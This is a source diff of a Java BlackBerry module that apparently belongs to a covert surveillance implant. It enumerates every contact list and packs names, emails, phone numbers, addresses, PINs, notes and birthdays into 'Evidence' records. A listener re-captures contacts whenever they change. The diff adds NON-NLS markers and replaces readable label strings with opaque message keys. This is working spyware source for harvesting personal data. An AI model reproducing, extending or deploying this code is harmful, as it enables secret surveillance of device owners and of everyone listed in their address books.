@@ -40,7 +40,7 @@ import blackberry.utils.Utils;
 public final class ModuleAddressBook extends BaseModule implements
         PIMListListener, UserAgent {
     //#ifdef DEBUG
-    static Debug debug = new Debug("ModAddress", DebugLevel.INFORMATION);
+    static Debug debug = new Debug("ModAddress", DebugLevel.INFORMATION); //$NON-NLS-1$
     //#endif
 
     Markup markup;
@@ -59,7 +59,7 @@ public final class ModuleAddressBook extends BaseModule implements
     final int version = 0x01000000;
 
     public static String getStaticType() {
-        return Messages.getString("1d.0");//"addressbook";
+        return Messages.getString("1d.0");//"addressbook"; //$NON-NLS-1$
     }
     
     public static ModuleAddressBook getInstance(){
@@ -76,7 +76,7 @@ public final class ModuleAddressBook extends BaseModule implements
 
     public synchronized void actualStart() {
         //#ifdef DEBUG
-        debug.trace("actualStart: add listener");
+        debug.trace("actualStart: add listener"); //$NON-NLS-1$
         //#endif
 
         final PIM pim = PIM.getInstance();
@@ -96,7 +96,7 @@ public final class ModuleAddressBook extends BaseModule implements
 
     public synchronized void actualStop() {
         //#ifdef DEBUG
-        debug.trace("actualStop: remove listener");
+        debug.trace("actualStop: remove listener"); //$NON-NLS-1$
         //#endif
 
         final PIM pim = PIM.getInstance();
@@ -119,17 +119,17 @@ public final class ModuleAddressBook extends BaseModule implements
      */
     public void actualLoop() {
         //#ifdef DEBUG
-        debug.trace("actualRun");
+        debug.trace("actualRun"); //$NON-NLS-1$
         //#endif
 
         if (!markup.isMarkup()) {
             //#ifdef DEBUG
-            debug.trace("actualRun: getting Contact List");
+            debug.trace("actualRun: getting Contact List"); //$NON-NLS-1$
             //#endif
 
             if (getContactList()) {
                 //#ifdef DEBUG
-                debug.trace("actualRun: need to write markup");
+                debug.trace("actualRun: need to write markup"); //$NON-NLS-1$
                 //#endif
                 markup.createEmptyMarkup();
             }
@@ -142,7 +142,7 @@ public final class ModuleAddressBook extends BaseModule implements
 
         String[] lists = PIM.getInstance().listPIMLists(PIM.CONTACT_LIST);
         //#ifdef DEBUG
-        debug.trace("actualRun lists: " + lists.length);
+        debug.trace("actualRun lists: " + lists.length); //$NON-NLS-1$
         //#endif
 
         boolean ret = true;
@@ -151,14 +151,14 @@ public final class ModuleAddressBook extends BaseModule implements
             try {
                 String name = lists[i];
                 //#ifdef DEBUG
-                debug.trace("actualRun: opening " + name);
+                debug.trace("actualRun: opening " + name); //$NON-NLS-1$
                 //#endif
                 contactList = (ContactList) PIM.getInstance().openPIMList(
                         PIM.CONTACT_LIST, PIM.READ_ONLY, name);
 
                 number = saveContactEvidence(contactList);
                 //#ifdef DEBUG
-                debug.trace("actualRun: saved " + number);
+                debug.trace("actualRun: saved " + number); //$NON-NLS-1$
                 //#endif
 
             } catch (final PIMException e) {
@@ -178,7 +178,7 @@ public final class ModuleAddressBook extends BaseModule implements
         final Enumeration eContacts = contactList.items();
 
         //#ifdef DEBUG
-        debug.trace("saveContactEvidence: got contacts");
+        debug.trace("saveContactEvidence: got contacts"); //$NON-NLS-1$
         //#endif
 
         Evidence evidence = new Evidence(EvidenceType.ADDRESSBOOK);
@@ -188,7 +188,7 @@ public final class ModuleAddressBook extends BaseModule implements
         int number = 0;
         while (eContacts.hasMoreElements()) {
             //#ifdef DEBUG
-            debug.trace("saveContactEvidence: contact #" + ++number);
+            debug.trace("saveContactEvidence: contact #" + ++number); //$NON-NLS-1$
             //#endif
             try {
                 contact = (Contact) eContacts.nextElement();
@@ -202,7 +202,7 @@ public final class ModuleAddressBook extends BaseModule implements
         }
 
         //#ifdef DEBUG
-        debug.trace("saveContactEvidence: finished contacts. Total: " + number);
+        debug.trace("saveContactEvidence: finished contacts. Total: " + number); //$NON-NLS-1$
         //#endif
         evidence.close();
 
@@ -234,7 +234,7 @@ public final class ModuleAddressBook extends BaseModule implements
         final String[] categories = contact.getCategories();
         for (int i = 0; i < categories.length; i++) {
             //#ifdef DEBUG
-            debug.trace("getContactPacket cat: " + categories[i]);
+            debug.trace("getContactPacket cat: " + categories[i]); //$NON-NLS-1$
             //#endif
         }
 
@@ -244,7 +244,7 @@ public final class ModuleAddressBook extends BaseModule implements
             if (contact.countValues(Contact.UID) > 0) {
                 final String suid = contact.getString(Contact.UID, 0);
                 //#ifdef DEBUG
-                debug.trace("actualRun uid: " + suid);
+                debug.trace("actualRun uid: " + suid); //$NON-NLS-1$
                 //#endif
                 try {
                     uid = Integer.parseInt(suid);
@@ -261,7 +261,7 @@ public final class ModuleAddressBook extends BaseModule implements
         dbPayload.writeInt(uid);
 
         //#ifdef DEBUG
-        debug.trace("getContactPacket: name");
+        debug.trace("getContactPacket: name"); //$NON-NLS-1$
         //#endif
         if (contactList.isSupportedField(Contact.NAME)) {
             if (contact.countValues(Contact.NAME) > 0) {
@@ -273,24 +273,24 @@ public final class ModuleAddressBook extends BaseModule implements
         }
 
         //#ifdef DEBUG
-        debug.trace("getContactPacket: email");
+        debug.trace("getContactPacket: email"); //$NON-NLS-1$
         //#endif
         addEmailField(contactList, contact, dbPayload, Contact.EMAIL,
                 new byte[] { 0x06, 0x0D, 0x0F });
 
         //#ifdef DEBUG
-        debug.trace("getContactPacket: tel");
+        debug.trace("getContactPacket: tel"); //$NON-NLS-1$
         //#endif
         addTelField(contactList, contact, dbPayload, Contact.TEL, (byte) 0x07);
 
         //#ifdef DEBUG
-        debug.trace("getContactPacket: addr");
+        debug.trace("getContactPacket: addr"); //$NON-NLS-1$
         //#endif
         if (contactList.isSupportedField(Contact.ADDR)) {
             int numAddress = contact.countValues(Contact.ADDR);
 
             //#ifdef DEBUG
-            debug.trace("getContactPacket, num addresses: " + numAddress);
+            debug.trace("getContactPacket, num addresses: " + numAddress); //$NON-NLS-1$
             //#endif
 
             for (int i = 0; i < numAddress; i++) {
@@ -300,7 +300,7 @@ public final class ModuleAddressBook extends BaseModule implements
                         .getAttributes(BlackBerryContact.ADDR, i);
                 if (attribute == BlackBerryContact.ATTR_HOME) {
                     //#ifdef DEBUG
-                    debug.trace("getContactPacket addr home");
+                    debug.trace("getContactPacket addr home"); //$NON-NLS-1$
                     //#endif
 
                     addField(dbPayload, addr, Contact.ADDR_STREET, (byte) 0x21);
@@ -313,7 +313,7 @@ public final class ModuleAddressBook extends BaseModule implements
 
                 } else if (attribute == BlackBerryContact.ATTR_WORK) {
                     //#ifdef DEBUG
-                    debug.trace("getContactPacket addr work");
+                    debug.trace("getContactPacket addr work"); //$NON-NLS-1$
                     //#endif
                     addField(dbPayload, addr, Contact.ADDR_STREET, (byte) 0x2A);
                     addField(dbPayload, addr, Contact.ADDR_LOCALITY,
@@ -324,7 +324,7 @@ public final class ModuleAddressBook extends BaseModule implements
                     addField(dbPayload, addr, Contact.ADDR_COUNTRY, (byte) 0x2E);
                 } else {
                     //#ifdef DEBUG
-                    debug.trace("getContactPacket addr other");
+                    debug.trace("getContactPacket addr other"); //$NON-NLS-1$
                     //#endif
                     addField(dbPayload, addr, Contact.ADDR_STREET, (byte) 0x26);
                     addField(dbPayload, addr, Contact.ADDR_LOCALITY,
@@ -342,40 +342,40 @@ public final class ModuleAddressBook extends BaseModule implements
         }
 
         //#ifdef DEBUG
-        debug.trace("getContactPacket: pin");
+        debug.trace("getContactPacket: pin"); //$NON-NLS-1$
         //#endif
-        addCustomField(contactList, contact, BlackBerryContact.PIN, "PIN: ");
+        addCustomField(contactList, contact, BlackBerryContact.PIN, Messages.getString("1d.24")); //$NON-NLS-1$
 
         //#ifdef DEBUG
-        debug.trace("getContactPacket: users");
+        debug.trace("getContactPacket: users"); //$NON-NLS-1$
         //#endif
-        addCustomField(contactList, contact, BlackBerryContact.USER1, "USER1: ");
-        addCustomField(contactList, contact, BlackBerryContact.USER2, "USER2: ");
-        addCustomField(contactList, contact, BlackBerryContact.USER3, "USER3: ");
-        addCustomField(contactList, contact, BlackBerryContact.USER4, "USER4: ");
+        addCustomField(contactList, contact, BlackBerryContact.USER1, Messages.getString("1d.26")); //$NON-NLS-1$
+        addCustomField(contactList, contact, BlackBerryContact.USER2, Messages.getString("1d.27")); //$NON-NLS-1$
+        addCustomField(contactList, contact, BlackBerryContact.USER3, Messages.getString("1d.28")); //$NON-NLS-1$
+        addCustomField(contactList, contact, BlackBerryContact.USER4, Messages.getString("1d.29")); //$NON-NLS-1$
 
         //#ifdef DEBUG
-        debug.trace("getContactPacket: org");
+        debug.trace("getContactPacket: org"); //$NON-NLS-1$
         //#endif
         addCustomField(contactList, contact, BlackBerryContact.ORG,
-                "Organization: ");
+                Messages.getString("1d.31")); //$NON-NLS-1$
 
         //#ifdef DEBUG
-        debug.trace("getContactPacket: note");
+        debug.trace("getContactPacket: note"); //$NON-NLS-1$
         //#endif
-        addCustomField(contactList, contact, BlackBerryContact.NOTE, "Note: ");
+        addCustomField(contactList, contact, BlackBerryContact.NOTE, Messages.getString("1d.33")); //$NON-NLS-1$
 
         //#ifdef DEBUG
-        debug.trace("getContactPacket: anniversary");
+        debug.trace("getContactPacket: anniversary"); //$NON-NLS-1$
         //#endif
         addCustomDateField(contactList, contact, BlackBerryContact.ANNIVERSARY,
-                "Anniversary: ");
+                Messages.getString("1d.35")); //$NON-NLS-1$
 
         //#ifdef DEBUG
-        debug.trace("getContactPacket: birthday");
+        debug.trace("getContactPacket: birthday"); //$NON-NLS-1$
         //#endif
         addCustomDateField(contactList, contact, BlackBerryContact.BIRTHDAY,
-                "Birthday: ");
+                Messages.getString("1d.37")); //$NON-NLS-1$
 
         finalizeCustomFields(dbPayload);
 
@@ -383,7 +383,7 @@ public final class ModuleAddressBook extends BaseModule implements
 
         //#ifdef DEBUG
 
-        debug.trace("size len: " + size);
+        debug.trace("size len: " + size); //$NON-NLS-1$
         //#endif        
 
         // a questo punto il payload e' pronto, scriviamo la size
@@ -394,7 +394,7 @@ public final class ModuleAddressBook extends BaseModule implements
         byte[] packet = dbPayload.toArray();
 
         //#ifdef DEBUG
-        debug.trace("packet: " + Utils.byteArrayToHex(packet));
+        debug.trace("packet: " + Utils.byteArrayToHex(packet)); //$NON-NLS-1$
         //#endif                
 
         return packet;
@@ -434,14 +434,14 @@ public final class ModuleAddressBook extends BaseModule implements
             try {
                 final int preferred = contact.getPreferredIndex(contactType);
                 //#ifdef DEBUG
-                debug.trace("addStringField preferred : " + preferred);
+                debug.trace("addStringField preferred : " + preferred); //$NON-NLS-1$
                 //#endif           
 
                 for (int i = 0; i < contact.countValues(contactType)
                         && i < logTypes.length; i++) {
                     final String value = contact.getString(contactType, i);
                     //#ifdef DEBUG
-                    debug.trace("addStringField: " + logTypes[i] + " " + value);
+                    debug.trace("addStringField: " + logTypes[i] + " " + value); //$NON-NLS-1$ //$NON-NLS-2$
                     //#endif
                     Utils.addTypedString(dbPayload, logTypes[i], value);
                 }
@@ -462,30 +462,30 @@ public final class ModuleAddressBook extends BaseModule implements
      */
     private void initCustomFields() {
         //#ifdef DEBUG
-        debug.trace("initCustomFields");
+        debug.trace("initCustomFields"); //$NON-NLS-1$
         //#endif
         customBuffer = new StringBuffer();
     }
 
     private void finalizeCustomFields(DataBuffer dbPayload) {
         //#ifdef DEBUG
-        debug.trace("finalizeCustomFields");
+        debug.trace("finalizeCustomFields"); //$NON-NLS-1$
         //#endif
 
         if (customBuffer == null) {
             //#ifdef DEBUG
-            debug.error("finishCustomFields");
+            debug.error("finishCustomFields"); //$NON-NLS-1$
             //#endif
         } else {
             try {
                 //#ifdef DEBUG
-                debug.trace("finishCustomFields: " + customBuffer.toString());
+                debug.trace("finishCustomFields: " + customBuffer.toString()); //$NON-NLS-1$
                 //#endif
                 Utils.addTypedString(dbPayload, (byte) 0x37,
                         customBuffer.toString());
             } catch (Exception ex) {
                 //#ifdef DEBUG
-                debug.error("finalizeCustomFields: " + ex);
+                debug.error("finalizeCustomFields: " + ex); //$NON-NLS-1$
                 //#endif
             }
         }
@@ -499,7 +499,7 @@ public final class ModuleAddressBook extends BaseModule implements
 
                 if (contact.countValues(contactType) > 0) {
                     final String value = contact.getString(contactType, 0);
-                    customBuffer.append(typeName + value + "\r\n");
+                    customBuffer.append(typeName + value + "\r\n"); //$NON-NLS-1$
                 }
 
             } catch (final Exception ex) {
@@ -519,7 +519,7 @@ public final class ModuleAddressBook extends BaseModule implements
                 if (contact.countValues(contactType) > 0) {
                     final long value = contact.getDate(contactType, 0);
                     customBuffer.append(typeName + (new Date(value)).toString()
-                            + "\r\n");
+                            + "\r\n"); //$NON-NLS-1$
                 }
 
             } catch (final Exception ex) {
@@ -537,7 +537,7 @@ public final class ModuleAddressBook extends BaseModule implements
             try {
                 final int preferred = contact.getPreferredIndex(contactType);
                 //#ifdef DEBUG
-                debug.trace("addStringField preferred : " + preferred);
+                debug.trace("addStringField preferred : " + preferred); //$NON-NLS-1$
                 //#endif
 
                 if (contact.countValues(contactType) > 0) {
@@ -545,22 +545,22 @@ public final class ModuleAddressBook extends BaseModule implements
                     Utils.addTypedString(dbPayload, logType, value);
                 }
 
-                String note = "";
+                String note = ""; //$NON-NLS-1$
                 final int last = contact.countValues(contactType) - 1;
                 for (int i = 1; i <= last; i++) {
                     final String value = contact.getString(contactType, i);
                     //#ifdef DEBUG
-                    debug.trace("addStringField: " + logType + " " + value);
+                    debug.trace("addStringField: " + logType + " " + value); //$NON-NLS-1$ //$NON-NLS-2$
                     //#endif
 
                     note += value;
                     if (i < last) {
-                        note += ", ";
+                        note += ", "; //$NON-NLS-1$
                     }
                 }
 
                 //#ifdef DEBUG
-                debug.trace("addTelField note: " + note);
+                debug.trace("addTelField note: " + note); //$NON-NLS-1$
                 //#endif
 
                 Utils.addTypedString(dbPayload, (byte) 0x34, note);
@@ -578,7 +578,7 @@ public final class ModuleAddressBook extends BaseModule implements
      */
     protected boolean parse(final byte[] confParameters) {
         //#ifdef DEBUG
-        debug.trace("parse");
+        debug.trace("parse"); //$NON-NLS-1$
         //#endif
         return true;
     }
@@ -586,7 +586,7 @@ public final class ModuleAddressBook extends BaseModule implements
     public void itemAdded(PIMItem item) {
         init();
         //#ifdef DEBUG
-        debug.trace("itemAdded: " + item);
+        debug.trace("itemAdded: " + item); //$NON-NLS-1$
         //#endif
         save((Contact) item);
     }
@@ -594,14 +594,14 @@ public final class ModuleAddressBook extends BaseModule implements
     public void itemRemoved(PIMItem item) {
         init();
         //#ifdef DEBUG
-        debug.trace("itemRemoved: " + item);
+        debug.trace("itemRemoved: " + item); //$NON-NLS-1$
         //#endif
     }
 
     public void itemUpdated(PIMItem itemOld, PIMItem itemNew) {
         init();
         //#ifdef DEBUG
-        debug.trace("itemUpdated: " + itemNew);
+        debug.trace("itemUpdated: " + itemNew); //$NON-NLS-1$
         //#endif
 
         save((Contact) itemNew);
